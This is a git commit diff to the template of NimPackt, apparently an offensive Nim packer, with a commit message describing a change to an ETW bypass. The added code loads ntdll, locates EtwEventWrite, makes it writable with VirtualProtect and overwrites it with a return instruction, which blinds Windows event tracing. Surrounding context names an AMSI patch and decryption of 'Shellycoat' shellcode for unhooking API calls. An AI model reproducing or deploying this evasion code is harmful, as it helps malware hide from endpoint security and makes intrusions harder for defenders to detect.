9292357d24070b04db0897be309d3cd20a71e75e
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-10-22 15:40:57 +0200

    Change ETW bypass - whishlist No. 2

--- templates/NimPackt-Template.nim
+++ templates/NimPackt-Template.nim
@@ -158,17 +158,34 @@ when defined patchAmsi:
         return disabled
 
 when defined disableEtw:
+    when defined amd64:
+        const patch: array[1, byte] = [byte 0xc3]
+    elif defined i386:
+        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
     proc dEtw(): bool =
-        var success : bool
-        var cometw = "COMPlus_ETWEnabled"
-        var setnull = "0"
-        putenv(cometw,setnull)
-        if getEnv(cometw) == setnull:
-            success = true
-        else:
-            success = false
-        return success
+        var
+        ntdll: LibHandle
+        cs: pointer
+        op: DWORD
+        t: DWORD
+        disabled: bool = false
 
+        ntdll = loadLib("ntdll")
+        if isNil(ntdll):
+            return disabled
+
+        cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
+        if isNil(cs):
+            return disabled
+
+        if VirtualProtect(cs, patch.len, 0x40, addr op):
+            echo "[*] Applying patch"
+            copyMem(cs, unsafeAddr patch, patch.len)
+            VirtualProtect(cs, patch.len, op, addr t)
+            disabled = true
+
+        return disabled
+           
 when defined patchApiCalls:
     # Decrypt Shellycoat shellcode
     proc dCryptApiC(cryptedCoat: string, key: array[16, byte], iv: array[16, byte]): seq[byte] =
